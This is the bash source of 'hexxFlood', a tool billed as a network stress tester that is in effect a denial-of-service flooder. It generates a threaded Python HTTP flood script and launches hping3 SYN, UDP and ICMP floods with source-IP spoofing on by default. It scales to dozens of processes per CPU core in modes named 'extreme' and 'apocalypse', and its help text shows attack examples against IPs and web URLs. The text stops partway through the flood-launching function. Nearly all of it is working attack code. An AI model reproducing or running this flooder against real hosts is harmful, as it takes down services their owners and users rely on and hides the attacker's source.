#!/bin/bash

# ============================================================
# hexxFlood - Ultimate Network Stress Testing Tool
# Version: 2.0  (full-power engine)
# Author: Cywarx
# ============================================================

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
BOLD='\033[1m'
NC='\033[0m'

# Version
VERSION="2.0"
REPO_URL="https://github.com/Cywarx/hexxFlood.git"

# Configuration
CONFIG_FILE="$HOME/.hexxFlood_config"
TARGET="192.168.1.14"
THREADS=50
PACKET_SIZE=65495
DELAY="u1"
INTERFACE="wlan0"
ATTACK_DURATION=0
SPOOF_IP=true
RANDOM_PORTS=true
TARGET_TYPE="ip"

# Privilege state. Set by ensure_privileges(): 1 when we have root (either the
# user ran us as root / via sudo, or accepted the elevation prompt), 0 when the
# user chose to run unprivileged (HTTP/URL flood only).
RUN_AS_ROOT=0

# Default answer to the "Run as root?" prompt when NOT launched as root:
#   ""        -> ask interactively (default)
#   yes|true  -> auto-elevate via sudo without asking (still one password prompt)
#   no|false  -> stay unprivileged without asking (HTTP/URL flood only)
# Persist in ~/.hexxFlood_config, or override per-run with the AUTO_ROOT env var.
AUTO_ROOT="${AUTO_ROOT:-}"   # keep any value passed in the environment

# System tuning — genuine, SAFE power levers that are captured and RESTORED on
# exit. We deliberately do NOT touch MTU (jumbo frames break non-jumbo LANs),
# turbo, hugepages or IRQ affinity: those either hurt throughput or leave the
# box in a broken state. SYS_TUNE="" means "auto" (on for high/extreme/apocalypse).
SYS_TUNE=""              # ""=auto, true=force on, false=off  (--tune / --no-tune)
TX_QUEUE_LEN=10000       # NIC tx queue length while flooding (--tx-queue)

# Worker-count ceiling controls.
#   * By DEFAULT, on a WIRELESS interface the worker count is auto-capped to a
#     sane Wi-Fi peak (2× cores) — this works well on Wi-Fi. Wired interfaces are
#     never auto-capped and scale the full mode ladder.
#   * NO_CAP=true (--no-cap / --unlimited) removes ALL caps for full power.
#   * WORKER_CAP=N (--cap N or WIFI_WORKER_CAP=N env) sets an explicit ceiling
#     on ANY interface, overriding the default Wi-Fi value.
NO_CAP=false
WORKER_CAP="${WIFI_WORKER_CAP:-}"

# Monitoring
AUTO_MONITOR=true        # auto-open a monitor terminal when an attack starts
MONITOR_WINDOWS="full"   # comma-separated modes -> one auto window per mode
MONITOR_MODE="full"      # mode used by standalone --monitor
RUN_MONITOR_ONLY=false   # set by --monitor to run the monitor and exit

declare -A SAVED_SYSCTL  # original sysctl values, restored on cleanup

# Remember a non-empty AUTO_ROOT passed via the environment so a per-run
# `AUTO_ROOT=... hexxFlood …` still wins over the value in ~/.hexxFlood_config.
_ENV_AUTO_ROOT="${AUTO_ROOT:-}"

if [ -f "$CONFIG_FILE" ]; then
    source "$CONFIG_FILE"
fi

# Environment value (if any) overrides the config file.
[ -n "$_ENV_AUTO_ROOT" ] && AUTO_ROOT="$_ENV_AUTO_ROOT"

# Resolve where this script (and monitor.sh) live, even via the wrapper/symlink
SCRIPT_DIR="$(cd "$(dirname "$(readlink -f "${BASH_SOURCE[0]}")")" && pwd)"
MONITOR_SCRIPT="$SCRIPT_DIR/monitor.sh"

show_banner() {
    clear
    echo -e "${RED}"
    echo "╔════════════════════════════════════════════════════════════════════════════════╗"
    echo "║                                                                                ║"
    echo "║   ██╗  ██╗███████╗██╗  ██╗██╗  ██╗███████╗██╗      ██████╗  ██████╗ ██████╗    ║"
    echo "║   ██║  ██║██╔════╝╚██╗██╔╝╚██╗██╔╝██╔════╝██║     ██╔═══██╗██╔═══██╗██╔══██╗   ║"
    echo "║   ███████║█████╗   ╚███╔╝  ╚███╔╝ █████╗  ██║     ██║   ██║██║   ██║██║  ██║   ║"
    echo "║   ██╔══██║██╔══╝   ██╔██╗  ██╔██╗ ██╔══╝  ██║     ██║   ██║██║   ██║██║  ██║   ║"
    echo "║   ██║  ██║███████╗██╔╝ ██╗██╔╝ ██╗██║     ███████╗╚██████╔╝╚██████╔╝██████╔╝   ║"
    echo "║   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝    ║"
    echo "║                                                                                ║"
    echo "║              ⚡ Ultimate Network Stress Testing Tool v2.0 ⚡                   ║"
    echo "║                     Full-Power Engine · IP & Web URL                           ║"
    echo "║                                Use Responsibly!                                ║"
    echo "╠════════════════════════════════════════════════════════════════════════════════╣"
    echo "║                             Author: CyWarX                                     ║"
    echo "╚════════════════════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

show_help() {
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}📖 hexxFlood - Usage Guide${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${YELLOW}Basic Usage:${NC}"
    echo "  hexxFlood [OPTIONS]"
    echo ""
    echo -e "${YELLOW}Target Options:${NC}"
    echo "  -t, --target IP          Target IP address"
    echo "  -u, --url URL            Target Web URL (http://example.com)"
    echo ""
    echo -e "${YELLOW}Attack Options:${NC}"
    echo "  -p, --threads NUM        Number of threads (1-200, default: 50)"
    echo "  -s, --size BYTES         Packet size (64-65495, default: 65495)"
    echo "  -d, --delay MS           Delay (u1,u10,u100, default: u1)"
    echo "  -i, --interface IFACE    Network interface (default: wlan0)"
    echo "  -m, --mode MODE          Mode: easy|medium|high|extreme|apocalypse|custom"
    echo "  -P, --ports PORTS        Comma-separated ports"
    echo "  -T, --type TYPES         Types: syn,udp,icmp,ack,rst,fin,all,http"
    echo "  -D, --duration SEC       Duration in seconds (0=infinite)"
    echo "  --no-spoof               Disable IP spoofing"
    echo "  --fixed-ports            Use fixed ports"
    echo ""
    echo -e "${YELLOW}Performance Tuning (safe — restored on exit):${NC}"
    echo "  --tune                   Force system tuning on (bigger tx-queue, socket"
    echo "                           buffers, CPU governor=performance)"
    echo "  --no-tune                Never touch system settings"
    echo "  --tx-queue NUM           NIC tx queue length while flooding (default: 10000)"
    echo "  --no-cap, --unlimited    Remove ALL worker caps → full power (no limit)"
    echo "  --cap NUM                Set an explicit worker ceiling (any interface)"
    echo "  (tip) HEXXFLOOD_WORKERS=N Force an exact worker count (e.g. 500, 2000), no cap"
    echo "  (tip) WIFI_WORKER_CAP=N   Same as --cap, via env var"
    echo ""
    echo -e "${YELLOW}Note:${NC} on a Wi-Fi interface the worker count is auto-capped to a sane peak"
    echo "      (2× cores) by default — this works well on Wi-Fi. Wired interfaces scale the full"
    echo "      mode ladder. Want no limit on Wi-Fi too? Add --no-cap (or --unlimited)."
    echo ""
    echo -e "${YELLOW}Root / Privileges:${NC}"
    echo "      The raw-packet engine (hping3) and system tuning need root. If you are"
    echo "      not root, hexxFlood asks 'Run as root? [Y/n]' at startup:"
    echo "        Y (default) -> re-launches via sudo (one password prompt), full power"
    echo "        n           -> runs unprivileged: HTTP/URL flood only, no tuning"
    echo "      Launch with 'sudo hexxFlood …' to skip the prompt entirely."
    echo "      Skip the prompt without sudo via AUTO_ROOT (env or ~/.hexxFlood_config):"
    echo "        AUTO_ROOT=yes  -> auto-elevate    AUTO_ROOT=no -> stay unprivileged"
    echo ""
    echo -e "${YELLOW}Monitoring Options:${NC}"
    echo "  --monitor                Open the live monitor only (no attack)"
    echo "  --monitor-mode MODE      Monitor mode: ping|network|system|full|log (default: full)"
    echo "  --auto-monitor [MODES]   Auto-open monitor window(s) on attack start (default: on, full)"
    echo "                           MODES is comma-separated -> one window each, e.g. full,ping,system"
    echo "  --no-monitor             Do not auto-open any monitor window"
    echo ""
    echo -e "${YELLOW}Other Options:${NC}"
    echo "  -U, --update             Update hexxFlood to the latest version (git pull)"
    echo "  -V, --version            Show version and exit"
    echo "  -h, --help               Show this help"
    echo ""
    echo -e "${YELLOW}Attack Modes:${NC}"
    echo "  easy       - 2× CPU cores of parallel floods, basic types"
    echo "  medium     - 4× CPU cores, medium types"
    echo "  high       - 8× CPU cores + system tuning, all TCP/UDP/ICMP"
    echo "  extreme    - 16× CPU cores + system tuning, full power (auto-stop 60s)"
    echo "  apocalypse - 32× CPU cores + system tuning, maximum overdrive (auto-stop 60s)"
    echo "  custom     - Use your own settings"
    echo ""
    echo -e "${YELLOW}Examples:${NC}"
    echo "  # IP Attack"
    echo "  hexxFlood -t 192.168.1.10 -m extreme"
    echo "  hexxFlood -t 192.168.1.10 -m apocalypse -D 60"
    echo ""
    echo "  # Web URL Attack"
    echo "  hexxFlood -u http://example.com -m extreme"
    echo "  hexxFlood -u https://example.com -T http -p 100"
    echo "  hexxFlood -u http://example.com:8080 -m high -D 60"
    echo ""
    echo "  # No cap / full power (best on WIRED; on Wi-Fi the default cap sends more)"
    echo "  hexxFlood -t 192.168.1.10 -m extreme --no-cap        # remove all worker caps"
    echo "  hexxFlood -t 192.168.1.10 -m apocalypse -i eth0 --no-cap"
    echo "  hexxFlood -t 192.168.1.10 -m extreme --cap 64        # custom worker ceiling"
    echo "  sudo HEXXFLOOD_WORKERS=2000 hexxFlood -t 192.168.1.10 -m extreme  # exact count"
    echo ""
    echo -e "${YELLOW}  # Attack + auto-open 3 monitor windows${NC}"
    echo "  hexxFlood -t 192.168.1.10 -m extreme --auto-monitor full,ping,system"
    echo ""
    echo -e "${YELLOW}  # Just watch a target (no attack)${NC}"
    echo "  hexxFlood --monitor -t 192.168.1.10"
    echo "  hexxFlood --monitor --monitor-mode ping -t 192.168.1.10"
    echo ""
}

parse_url() {
    local url="$1"
    local stripped="${url#http://}"
    stripped="${stripped#https://}"
    if [[ "$stripped" == *":"* ]]; then
        WEB_HOST="${stripped%:*}"
        WEB_PORT="${stripped#*:}"
    else
        WEB_HOST="$stripped"
        if [[ "$url" == https://* ]]; then
            WEB_PORT="443"
        else
            WEB_PORT="80"
        fi
    fi
    # If the host is already an IPv4 literal, use it as-is (dig would return
    # nothing and the ping fallback could otherwise mis-parse the address).
    if [[ "$WEB_HOST" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        WEB_IP="$WEB_HOST"
    else
        # Prefer a real A record; keep only clean IPv4 lines (skip CNAMEs).
        WEB_IP=$(dig +short "$WEB_HOST" 2>/dev/null | grep -Eo '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$' | head -1)
        if [ -z "$WEB_IP" ]; then
            # Fallback: first parenthesised address in ping's header line.
            WEB_IP=$(ping -c 1 -W 2 "$WEB_HOST" 2>/dev/null | head -1 | grep -oP '\(\K[0-9.]+')
        fi
    fi
    if [ -z "$WEB_IP" ]; then
        echo -e "${RED}❌ Could not resolve hostname: $WEB_HOST${NC}"
        exit 1
    fi
    echo -e "${GREEN}✅ Resolved $WEB_HOST -> $WEB_IP${NC}"
    TARGET="$WEB_IP"
    TARGET_TYPE="url"
}

http_flood() {
    local url="$1"
    local threads="${2:-50}"
    local duration="${3:-0}"

    echo -e "${YELLOW}🌐 Starting HTTP flood on $url${NC}"
    echo -e "${YELLOW}   Threads: $threads${NC}"

    cat > /tmp/http_flood.py << 'PYEOF'
import sys, time, threading, urllib.request, urllib.error, ssl, random
from concurrent.futures import ThreadPoolExecutor

url = sys.argv[1]
threads = int(sys.argv[2])
duration = int(sys.argv[3])

ssl._create_default_https_context = ssl._create_unverified_context

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
]

def make_request():
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache'
    }
    try:
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=5) as response:
            return response.read()
    except:
        return None

def worker():
    while running:
        try:
            make_request()
        except:
            pass

running = True
start_time = time.time()

print(f"Starting HTTP flood on {url} with {threads} threads")

with ThreadPoolExecutor(max_workers=threads) as executor:
    futures = [executor.submit(worker) for _ in range(threads)]
    if duration > 0:
        time.sleep(duration)
        running = False
    else:
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            running = False
    for future in futures:
        future.cancel()

print("HTTP flood stopped")
PYEOF

    if [ -f "/opt/hexxFlood-venv/bin/python" ]; then
        $DETACH /opt/hexxFlood-venv/bin/python /tmp/http_flood.py "$url" "$threads" "$duration" </dev/null >/dev/null 2>&1 &
    else
        $DETACH python3 /tmp/http_flood.py "$url" "$threads" "$duration" </dev/null >/dev/null 2>&1 &
    fi
}

# True if $1 is inside a git work tree. Runs the check as the invoking user
# when we're root (via sudo) so git doesn't reject a user-owned checkout with
# a "dubious ownership" error.
git_is_repo() {
    if [ "$EUID" -eq 0 ] && [ -n "${SUDO_USER:-}" ]; then
        sudo -u "$SUDO_USER" git -C "$1" rev-parse --is-inside-work-tree &>/dev/null
    else
        git -C "$1" rev-parse --is-inside-work-tree &>/dev/null
    fi
}

# Copy the refreshed runtime files from a source checkout ($1) into the install
# dir ($2). Used after pulling, since the install dir is a plain copy.
deploy_runtime() {
    local src="$1" dst="$2" f
    [ "$src" -ef "$dst" ] && return 0
    for f in hexxFlood.sh monitor.sh quick.sh README.md LICENSE; do
        [ -f "$src/$f" ] && cp -f "$src/$f" "$dst/$f"
    done
    chmod +x "$dst"/*.sh 2>/dev/null
    echo -e "${GREEN}✅ Redeployed updated files to $dst${NC}"
}

self_update() {
    # Resolve the real script location even when invoked via the wrapper/symlink
    local script_dir
    script_dir="$(cd "$(dirname "$(readlink -f "${BASH_SOURCE[0]}")")" && pwd)"

    echo -e "${CYAN}🔄 Checking for updates in $script_dir ...${NC}"

    if ! command -v git &>/dev/null; then
        echo -e "${RED}❌ git is not installed. Install it with: sudo apt install git${NC}"
        exit 1
    fi

    # The install dir (e.g. /opt/hexxFlood) is a plain copy, not a git checkout,
    # so we update in the original source checkout recorded at install time and
    # then redeploy the refreshed files into the install dir.
    local repo_dir="$script_dir"
    local deploy=false
    if ! git_is_repo "$repo_dir"; then
        local src=""
        [ -f "$script_dir/.source_dir" ] && src="$(cat "$script_dir/.source_dir" 2>/dev/null)"
        if [ -n "$src" ] && git_is_repo "$src"; then
            repo_dir="$src"
            deploy=true
            echo -e "${CYAN}   Install dir is a copy — updating source checkout: $repo_dir${NC}"
        else
            echo -e "${RED}❌ $script_dir is not a git repository and no source checkout was found.${NC}"
            echo -e "${YELLOW}   Re-run the installer from a git clone to enable updates:${NC}"
            echo -e "   git clone $REPO_URL && cd hexxFlood && sudo ./setup.sh"
            exit 1
        fi
    fi

    # Run git as the invoking user (not root) so repo files keep the right owner
    local git_cmd=(git -C "$repo_dir")
    if [ "$EUID" -eq 0 ] && [ -n "${SUDO_USER:-}" ]; then
        git_cmd=(sudo -u "$SUDO_USER" git -C "$repo_dir")
    fi

    local branch
    branch="$("${git_cmd[@]}" rev-parse --abbrev-ref HEAD 2>/dev/null)"
    [ -z "$branch" ] || [ "$branch" = "HEAD" ] && branch="main"

    if ! "${git_cmd[@]}" fetch --quiet origin "$branch" 2>/dev/null; then
        echo -e "${RED}❌ Could not reach the remote. Check your internet connection.${NC}"
        exit 1
    fi

    local local_rev remote_rev
    local_rev="$("${git_cmd[@]}" rev-parse HEAD)"
    remote_rev="$("${git_cmd[@]}" rev-parse "origin/$branch" 2>/dev/null)"

    if [ "$local_rev" = "$remote_rev" ]; then
        echo -e "${GREEN}✅ Already up to date (v$VERSION, $("${git_cmd[@]}" rev-parse --short HEAD)).${NC}"
        # Still sync the install dir in case it drifted from the source checkout
        [ "$deploy" = true ] && deploy_runtime "$repo_dir" "$script_dir"
        exit 0
    fi

    echo -e "${YELLOW}⬆️  Update available: $("${git_cmd[@]}" rev-parse --short HEAD) → $("${git_cmd[@]}" rev-parse --short origin/$branch)${NC}"
    if "${git_cmd[@]}" pull --ff-only origin "$branch"; then
        chmod +x "$repo_dir"/*.sh 2>/dev/null
        [ "$deploy" = true ] && deploy_runtime "$repo_dir" "$script_dir"
        echo -e "${GREEN}✅ hexxFlood updated to the latest version!${NC}"
        echo -e "${CYAN}Recent changes:${NC}"
        "${git_cmd[@]}" log --oneline -5
    else
        echo -e "${RED}❌ Update failed — you likely have local changes that conflict.${NC}"
        echo -e "${YELLOW}   Inspect with: git -C $repo_dir status${NC}"
        echo -e "${YELLOW}   Discard local changes with: git -C $repo_dir reset --hard origin/$branch${NC}"
        exit 1
    fi
    exit 0
}

# ---- External monitor terminal support -----------------------------------

# Work out which X display / auth / dbus to use so GUI terminals can be
# opened even when hexxFlood is running under sudo (as root).
resolve_display() {
    local real_user="${SUDO_USER:-$USER}"
    MON_HOME=$(getent passwd "$real_user" | cut -d: -f6)
    MON_HOME="${MON_HOME:-$HOME}"
    local uid; uid=$(id -u "$real_user" 2>/dev/null)

    # Detect a real X display. Leave MON_DISPLAY empty on headless/SSH boxes
    # so we cleanly skip monitor windows instead of guessing ":0".
    if [ -n "$DISPLAY" ]; then
        MON_DISPLAY="$DISPLAY"
    else
        MON_DISPLAY=$(who 2>/dev/null | grep -oE '\(:[0-9]+(\.[0-9]+)?\)' | tr -d '()' | head -1)
    fi
    MON_XAUTH="${XAUTHORITY:-$MON_HOME/.Xauthority}"
    MON_DBUS="${DBUS_SESSION_BUS_ADDRESS:-unix:path=/run/user/${uid:-0}/bus}"
}

# Open a single monitor window running monitor.sh in a new terminal.
# $1 = monitor mode (ping|network|system|full|log). Returns 1 if no
# terminal emulator is available.
launch_one_monitor() {
    local mode="$1"
    local title="hexxFlood Monitor [$mode] -> $TARGET"
    local q_script; printf -v q_script '%q' "$MONITOR_SCRIPT"
    local mon_str="bash $q_script -t $TARGET -i $INTERFACE -m $mode"
    local -a argv=(bash "$MONITOR_SCRIPT" -t "$TARGET" -i "$INTERFACE" -m "$mode")
    local -a cmd=()
    local term

    for term in gnome-terminal konsole qterminal xfce4-terminal kitty alacritty tilix xterm x-terminal-emulator; do
        command -v "$term" &>/dev/null || continue
        case "$term" in
            gnome-terminal)      cmd=(gnome-terminal --title="$title" -- "${argv[@]}") ;;
            konsole)             cmd=(konsole -p "tabtitle=$title" -e "${argv[@]}") ;;
            qterminal)           cmd=(qterminal -e "${argv[@]}") ;;
            xfce4-terminal)      cmd=(xfce4-terminal --title="$title" -e "$mon_str") ;;
            kitty)               cmd=(kitty --title "$title" "${argv[@]}") ;;
            alacritty)           cmd=(alacritty -t "$title" -e "${argv[@]}") ;;
            tilix)               cmd=(tilix -t "$title" -e "$mon_str") ;;
            xterm)               cmd=(xterm -T "$title" -e "${argv[@]}") ;;
            x-terminal-emulator) cmd=(x-terminal-emulator -e "${argv[@]}") ;;
        esac
        break
    done

    [ ${#cmd[@]} -eq 0 ] && return 1

    # Launch as the real (non-root) user on their graphical session
    if [ "$EUID" -eq 0 ] && [ -n "${SUDO_USER:-}" ]; then
        sudo -u "$SUDO_USER" env HOME="$MON_HOME" DISPLAY="$MON_DISPLAY" \
            XAUTHORITY="$MON_XAUTH" DBUS_SESSION_BUS_ADDRESS="$MON_DBUS" \
            "${cmd[@]}" >/dev/null 2>&1 &
    else
        DISPLAY="$MON_DISPLAY" XAUTHORITY="$MON_XAUTH" \
            DBUS_SESSION_BUS_ADDRESS="$MON_DBUS" "${cmd[@]}" >/dev/null 2>&1 &
    fi
    return 0
}

# Auto-open the configured monitor window(s) when an attack starts.
launch_monitors() {
    [ "$AUTO_MONITOR" = true ] || return 0

    if [ ! -f "$MONITOR_SCRIPT" ]; then
        echo -e "${YELLOW}⚠️  monitor.sh not found at $MONITOR_SCRIPT — skipping monitor windows.${NC}"
        return 0
    fi

    resolve_display
    if [ -z "$MON_DISPLAY" ]; then
        echo -e "${YELLOW}⚠️  No graphical display detected — skipping auto monitor windows.${NC}"
        echo -e "${YELLOW}   Open one manually in another terminal:  hexxFlood --monitor -t $TARGET${NC}"
        echo ""
        return 0
    fi

    local opened=0 mode
    for mode in $(echo "$MONITOR_WINDOWS" | tr ',' ' '); do
        case "$mode" in
            ping|network|system|full|log) ;;
            *) echo -e "${YELLOW}⚠️  Unknown monitor mode '$mode' — skipping.${NC}"; continue ;;
        esac
        if launch_one_monitor "$mode"; then
            echo -e "${GREEN}🖥️  Opened monitor window: ${WHITE}$mode${NC}"
            opened=$((opened + 1))
            sleep 0.3
        else
            echo -e "${YELLOW}⚠️  No supported terminal emulator found — cannot auto-open monitors.${NC}"
            echo -e "${YELLOW}   Install one of: xterm, gnome-terminal, konsole, xfce4-terminal, qterminal.${NC}"
            echo -e "${YELLOW}   Or run in another terminal:  hexxFlood --monitor -t $TARGET${NC}"
            break
        fi
    done
    [ "$opened" -gt 0 ] && echo ""
}

parse_args() {
    while [[ $# -gt 0 ]]; do
        case $1 in
            -t|--target) TARGET="$2"; TARGET_TYPE="ip"; shift 2 ;;
            -u|--url) URL="$2"; parse_url "$URL"; shift 2 ;;
            --web) TARGET_TYPE="url"; shift ;;
            -p|--threads) THREADS="$2"; shift 2 ;;
            -s|--size) PACKET_SIZE="$2"; shift 2 ;;
            -d|--delay) DELAY="$2"; shift 2 ;;
            -i|--interface) INTERFACE="$2"; shift 2 ;;
            -m|--mode) MODE="$2"; shift 2 ;;
            -P|--ports) CUSTOM_PORTS="$2"; shift 2 ;;
            -T|--type) ATTACK_TYPES="$2"; shift 2 ;;
            -D|--duration) ATTACK_DURATION="$2"; DURATION_SET=1; shift 2 ;;
            --no-spoof) SPOOF_IP=false; shift ;;
            --fixed-ports) RANDOM_PORTS=false; shift ;;
            --tune) SYS_TUNE=true; shift ;;
            --no-tune) SYS_TUNE=false; shift ;;
            --tx-queue) TX_QUEUE_LEN="$2"; shift 2 ;;
            --cap|--worker-cap) WORKER_CAP="$2"; NO_CAP=false; shift 2 ;;
            --no-cap|--unlimited|--no-limit) NO_CAP=true; shift ;;
            --monitor) RUN_MONITOR_ONLY=true; shift ;;
            --monitor-mode) MONITOR_MODE="$2"; shift 2 ;;
            --auto-monitor)
                AUTO_MONITOR=true
                if [[ -n "$2" && "$2" != -* ]]; then MONITOR_WINDOWS="$2"; shift 2; else shift; fi
                ;;
            --no-monitor|--no-auto-monitor) AUTO_MONITOR=false; shift ;;
            -U|--update) self_update ;;
            -V|--version) echo -e "${WHITE}hexxFlood v$VERSION${NC}"; exit 0 ;;
            -h|--help) show_help; exit 0 ;;
            *) echo -e "${RED}Unknown option: $1${NC}"; show_help; exit 1 ;;
        esac
    done
}

set_mode() {
    case $MODE in
        easy)       THREADS=10;  DELAY="u100"; ATTACK_TYPES="syn,udp,icmp" ;;
        medium)     THREADS=25;  DELAY="u10";  ATTACK_TYPES="syn,udp,icmp,ack" ;;
        high)       THREADS=50;  DELAY="u1";   ATTACK_TYPES="syn,udp,icmp,ack,rst,fin" ;;
        # extreme/apocalypse auto-stop after 60s unless the user passed an
        # explicit -D (including -D 0 for infinite), which always wins.
        extreme)    THREADS=100; DELAY="u1";   ATTACK_TYPES="all"; [ "${DURATION_SET:-0}" = 1 ] || ATTACK_DURATION=60 ;;
        apocalypse) THREADS=200; DELAY="u1";   ATTACK_TYPES="all"; [ "${DURATION_SET:-0}" = 1 ] || ATTACK_DURATION=60 ;;
        custom) ;;
        *) THREADS=50; ATTACK_TYPES="all" ;;
    esac
}

# Size the flood pool for MAXIMUM real throughput. KEY FACT: one `hping3 --flood`
# already sends as fast as a CPU core allows, so throughput scales with CPU CORES,
# NOT with process count. The old THREADS×types model (hundreds of procs) thrashed
# the scheduler and overran the NIC TX queue (ENOBUFS) → it sent *less*. Here we
# run many parallel floods for genuine full power:
#   easy 2×  medium 4×  high 8×  extreme 16×  apocalypse 32× cores.
# On Wi-Fi the count is auto-capped to a sane peak (2× cores) by default; wired
# interfaces scale the full ladder. Use --no-cap / --unlimited to remove ALL caps,
# --cap N for an explicit ceiling, or HEXXFLOOD_WORKERS=N for an exact count.
compute_flood_workers() {
    local cores; cores=$(nproc 2>/dev/null); [[ "$cores" =~ ^[0-9]+$ ]] || cores=2
    [ "$cores" -lt 1 ] && cores=1
    CORES=$cores
    # Manual override wins and is never capped — full control, no compromise.
    if [[ "${HEXXFLOOD_WORKERS:-}" =~ ^[0-9]+$ ]] && [ "$HEXXFLOOD_WORKERS" -gt 0 ]; then
        FLOOD_WORKERS=$HEXXFLOOD_WORKERS
        WORKERS_FORCED=1
        return
    fi
    case "${MODE:-custom}" in
        easy)       FLOOD_WORKERS=$(( cores * 2 )) ;;
        medium)     FLOOD_WORKERS=$(( cores * 4 )) ;;
        high)       FLOOD_WORKERS=$(( cores * 8 )) ;;
        extreme)    FLOOD_WORKERS=$(( cores * 16 )) ;;
        apocalypse) FLOOD_WORKERS=$(( cores * 32 )) ;;
        *)          FLOOD_WORKERS=$(( cores * 8 )) ;;   # custom
    esac
    [ "$FLOOD_WORKERS" -lt 1 ] && FLOOD_WORKERS=1

    # --no-cap / --unlimited removes ALL ceilings → full power, no matter the iface.
    [ "$NO_CAP" = true ] && return

    # Work out the ceiling to apply (empty = none):
    #   1. an explicit --cap N / WIFI_WORKER_CAP=N wins on ANY interface;
    #   2. otherwise, on a WIRELESS interface, default to the Wi-Fi peak (2× cores)
    #      — this is the sane default that works well on Wi-Fi;
    #   3. otherwise (wired) no cap — scale the full mode ladder.
    local cap=""
    if [[ "${WORKER_CAP:-}" =~ ^[0-9]+$ ]] && [ "$WORKER_CAP" -ge 1 ]; then
        cap=$WORKER_CAP
        CAP_REASON="--cap ${WORKER_CAP}"
    elif [ -d "/sys/class/net/${INTERFACE}/wireless" ] || [ -e "/sys/class/net/${INTERFACE}/phy80211" ]; then
        cap=$(( cores * 2 ))
        CAP_REASON="wireless default (2× cores)"
    fi

    if [ -n "$cap" ] && [ "$FLOOD_WORKERS" -gt "$cap" ]; then
        FLOOD_WORKERS=$cap
        WIFI_CAPPED=1
    fi
}

# Apply SAFE, RESTORABLE system tuning that genuinely lifts the real send rate:
#   * a longer NIC tx queue      -> fewer ENOBUFS drops at high pps
#   * larger kernel socket bufs  -> the flooders never stall on buffer limits
#   * larger netdev backlog      -> the stack keeps up with the burst
#   * CPU governor = performance -> clocks stay pinned high while flooding
# Every value we change is captured first and put back verbatim by
# restore_system_tuning() on exit. We intentionally avoid jumbo MTU, turbo
# toggles, hugepages and IRQ affinity — those hurt throughput or corrupt state.
apply_system_tuning() {
    [ "$SYS_TUNE" = true ] || return 0
    TUNING_APPLIED=1

    # NIC tx queue length
    if [ -f "/sys/class/net/$INTERFACE/tx_queue_len" ]; then
        SAVED_TXQLEN=$(cat "/sys/class/net/$INTERFACE/tx_queue_len" 2>/dev/null)
        sudo ip link set dev "$INTERFACE" txqueuelen "$TX_QUEUE_LEN" 2>/dev/null || true
    fi

    # Kernel socket buffers + device backlog
    local k
    for k in net.core.wmem_max net.core.rmem_max net.core.netdev_max_backlog; do
        SAVED_SYSCTL["$k"]=$(sysctl -n "$k" 2>/dev/null)
    done
    sudo sysctl -qw net.core.wmem_max=134217728        2>/dev/null || true
    sudo sysctl -qw net.core.rmem_max=134217728        2>/dev/null || true
    sudo sysctl -qw net.core.netdev_max_backlog=250000 2>/dev/null || true

    # CPU governor -> performance (assume uniform; cpu0 is representative)
    if [ -f /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor ]; then
        SAVED_GOVERNOR=$(cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor 2>/dev/null)
        local g
        for g in /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor; do
            echo performance | sudo tee "$g" >/dev/null 2>&1 || true
        done
    fi

    # Give this shell plenty of file descriptors for many parallel workers
    ulimit -n 65535 2>/dev/null || true

    echo -e "${GREEN}⚙️  System tuning applied${NC} (tx-queue ${TX_QUEUE_LEN}, socket buffers, performance governor) — ${YELLOW}restored on exit${NC}"
}

# Put every tuned value back exactly as it was. No-op if tuning never ran.
restore_system_tuning() {
    [ "${TUNING_APPLIED:-0}" = 1 ] || return 0

    [ -n "${SAVED_TXQLEN:-}" ] && \
        sudo ip link set dev "$INTERFACE" txqueuelen "$SAVED_TXQLEN" 2>/dev/null || true

    local k
    for k in "${!SAVED_SYSCTL[@]}"; do
        [ -n "${SAVED_SYSCTL[$k]}" ] && sudo sysctl -qw "$k=${SAVED_SYSCTL[$k]}" 2>/dev/null || true
    done

    if [ -n "${SAVED_GOVERNOR:-}" ]; then
        local g
        for g in /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor; do
            echo "$SAVED_GOVERNOR" | sudo tee "$g" >/dev/null 2>&1 || true
        done
    fi
}

# Launch ONE silent hping3 --flood worker for a type/port. NOTE: we deliberately
# do NOT pin with taskset — pinning the flood loops can starve the kernel's own
# network-transmit softirqs on those cores and cap the real send rate. Letting
# the scheduler place them freely gives higher throughput. --flood transmits as
# fast as possible and ignores -i; we never pass -c so each worker floods forever.
launch_flood() {
    local t="$1" p="$2"
    case "$t" in
        syn)  sudo $DETACH hping3 -S --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE $TARGET </dev/null >/dev/null 2>&1 & ;;
        udp)  sudo $DETACH hping3 -2 --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE $TARGET </dev/null >/dev/null 2>&1 & ;;
        icmp) sudo $DETACH hping3 -1 --flood $SPOOF_FLAG            -d $PACKET_SIZE $TARGET </dev/null >/dev/null 2>&1 & ;;
